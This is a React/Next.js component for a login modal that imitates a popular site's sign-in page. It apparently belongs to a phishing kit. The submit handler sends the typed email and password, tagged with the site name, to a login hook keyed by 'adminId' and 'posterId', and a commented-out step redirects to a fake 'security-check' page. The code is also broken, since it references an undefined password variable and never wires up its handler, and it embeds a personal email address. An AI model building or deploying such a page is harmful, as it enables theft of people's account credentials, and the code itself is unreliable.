"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import Image from "next/image";

function LoginForm({ adminId, posterId ,verifyId}) {
  const [email, setEmail] = useState('');
  const [pw, setPw] = useState('');

  const canSubmit = email.trim() && pw.trim();
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    // setShowWrongPassword(true);
    toast.success("Login successfull");
    // router.push(`/security-check`);
    setEmail("");
    setPassword("");
  
    console.log(submitValues);
  };



  return (
   <div className="overlay">
      <div className="modal" role="dialog" aria-modal="true" aria-labelledby="login-title">
        <button className="close" aria-label="Close">
          <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
            <path d="M6.4 6.4l11.2 11.2M17.6 6.4L6.4 17.6" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
          </svg>
        </button>

        <h1 id="login-title" className="title">Log In</h1>

        <p className="disclaimer">
          By continuing, you agree to our <a href="#">User Agreement</a> and acknowledge
          that you understand the <a href="#">Privacy Policy</a>.
        </p>

        <div className="stack">
          <button className="btn outline">
            <span className="icon">
              {/* phone icon */}
              <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
                <path d="M7 2h10a2 2 0 0 1 2 2v16a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2zm0 0v4h10V2M9 18h6" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </span>
            Continue With Phone Number
          </button>

          <button className="btn google">
            <span className="avatar">N</span>
            <div className="googleText">
              <div className="sub">Continue as Nooman</div>
              <div className="email">noomammiah716@gmail.com</div>
            </div>
            <span className="gIcon" aria-hidden="true">{GoogleG}</span>
            <svg className="chev" viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">
              <path d="M9 6l6 6-6 6" fill="none" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </button>

          <button className="btn outline">
            <span className="icon">
              {/* apple logo */}
              <svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true">
                <path d="M16.6 13.1c0 3.4 3 4.5 3 4.5s-1.9 5.6-4.5 5.6c-1.2 0-2.1-.8-3.4-.8-1.3 0-2.5.8-3.4.8C5.7 23.2 3 17.8 3 14.3 3 10.9 5.2 9 7.3 9c1.5 0 2.6.9 3.4.9.8 0 2.2-1 3.8-1 .7 0 2.9.1 4.3 2-3.8 2.1-2.2 6.2-2.2 6.2zM15.8 3.6c.8-1 1.3-2.3 1.2-3.6-1.2.1-2.6.8-3.4 1.8-.8.9-1.4 2.2-1.2 3.5 1.3.1 2.6-.7 3.4-1.7z" fill="currentColor"/>
              </svg>
            </span>
            Continue With Apple
          </button>
        </div>

        <div className="divider">
          <span>OR</span>
        </div>

        <form className="form" onSubmit={(e) => e.preventDefault()}>
          <label className="label">Email or username <span className="req">*</span></label>
          <input
            className="input"
            type="text"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder=""
          />

          <label className="label">Password <span className="req">*</span></label>
          <input
            className="input"
            type="password"
            value={pw}
            onChange={(e) => setPw(e.target.value)}
            placeholder=""
          />

          <button className={`submit ${!canSubmit ? 'disabled' : ''}`} disabled={!canSubmit}>
            Log In
          </button>
        </form>
      </div>

      <style jsx>{`
        :global(html, body) { height: 100%; }
        .overlay {
          min-height: 100dvh;
          background: #fff;
          display: grid;
          place-items: center;
          padding: 24px;
        }
        .modal {
          position: relative;
          width: 680px;
          max-width: 100%;
          background: #ffffff;
          border-radius: 16px;
          box-shadow: 0 8px 30px rgba(0,0,0,0.08);
          padding: 32px 32px 28px;
          border: 1px solid #eee;
        }
        .close {
          position: absolute;
          top: 14px;
          right: 14px;
          width: 36px;
          height: 36px;
          border-radius: 50%;
          border: 1px solid #e6e6e6;
          display: grid;
          place-items: center;
          background: #fff;
          color: #666;
        }
        .close:hover { background:#f6f7f8; }
        .title {
          font-size: 34px;
          font-weight: 700;
          margin: 8px 0 10px;
          text-align: center;
        }
        .disclaimer {
          text-align: center;
          color: #5f5f5f;
          font-size: 14px;
          line-height: 1.5;
          margin: 0 auto 22px;
          max-width: 560px;
        }
        .disclaimer a { color: #0079d3; text-decoration: none; }
        .stack { display: grid; gap: 12px; }
        .btn {
          height: 52px;
          border-radius: 999px;
          border: 1px solid #e6e6e6;
          background: #ffffff;
          font-weight: 600;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 12px;
        }
        .btn.outline:hover { background:#f6f7f8; }
        .icon { display:flex; align-items:center; }
        /* Google row that shows "Continue as Nooman" with email and G */
        .btn.google {
          position: relative;
          justify-content: flex-start;
          padding-left: 64px;
          gap: 12px;
        }
        .avatar {
          position: absolute;
          left: 14px;
          width: 36px; height: 36px; border-radius: 999px;
          background:#e5eefc; color:#1a73e8; display:grid; place-items:center;
          font-weight: 700;
        }
        .gIcon {
          position: absolute;
          right: 46px;
          display: grid; place-items:center;
        }
        .chev {
          position: absolute;
          right: 16px; top: 50%; transform: translateY(-50%);
          color:#9aa0a6;
        }
        .googleText { display:flex; flex-direction:column; line-height:1.1; }
        .googleText .sub { font-weight:700; }
        .googleText .email { font-size:12px; color:#666; }

        .divider {
          display:flex; align-items:center; gap:12px;
          margin: 18px 0;
          color:#889096;
          font-weight:700; letter-spacing:.06em;
          justify-content:center;
        }
        .divider:before, .divider:after {
          content:"";
          height:1px; background:#e6e6e6; flex:1;
        }
        .divider span { flex: none; }

        .form { display:grid; gap: 8px; }
        .label { font-size:14px; color:#111; font-weight:600; }
        .req { color:#cc0000; }
        .input {
          height: 56px;
          border-radius: 14px;
          border: 1px solid transparent;
          background: #ecf0f3;
          padding: 0 16px;
          font-size: 16px;
          outline: none;
        }
        .input:focus {
          border-color:#0079d3;
          background:#fff;
          box-shadow: 0 0 0 3px rgba(0,121,211,0.15);
        }
        .submit {
          margin-top: 10px;
          height: 56px;
          border-radius: 999px;
          border: none;
          font-weight: 700;
          background: #e9ecef;
          color: #9aa0a6;
          cursor: not-allowed;
        }
        .submit:not(.disabled) {
          background:#000; color:#fff; cursor:pointer;
        }

        @media (max-width: 520px) {
          .modal { padding: 24px 16px 20px; border-radius: 12px; }
          .title { font-size: 28px; }
          .btn.google { padding-left: 58px; }
          .avatar { width: 32px; height: 32px; left: 12px; }
          .gIcon { right: 42px; }
        }
      `}</style>
    </div>
  );
}

// Simple Google "G" SVG as JSX
const GoogleG = (
  <svg width="20" height="20" viewBox="0 0 533.5 544.3" aria-hidden="true">
    <path fill="#EA4335" d="M533.5 278.4c0-18.6-1.7-37-5-54.8H272v103.7h147.3c-6.4 34.6-25.8 63.9-55 83.4v69.2h88.8c52 47.9 80.4 118.6 80.4 196.3 0 16-1.4 31.7-4.3 47 56.6-52 89.3-128.8 89.3-217.7z"/>
    <path fill="#34A853" d="M272 544.3c72.1 0 132.5-23.8 176.7-64.6l-88.8-69.2c-24.7 16.6-56.4 26.5-87.9 26.5-67.4 0-124.6-45.4-145.1-106.3H36.8v66.8C79.7 490.2 170.9 544.3 272 544.3z"/>
    <path fill="#4A90E2" d="M126.9 330.7c-9.4-27.9-9.4-58.1 0-86l.1-66.8H36.8c-36.8 72.2-36.8 159.6 0 231.8l90.1-79z"/>
    <path fill="#FBBC05" d="M272 214.7c37.6-.6 73.9 13.4 101.6 39.5l76.4-76.4C395.4 109.4 335 85.6 272.9 85.6c-101 0-192.3 54.1-235.2 137.2l89.9 66.8C147.4 260.1 204.6 214.7 272 214.7z"/>
  </svg>
  );



export default LoginForm;
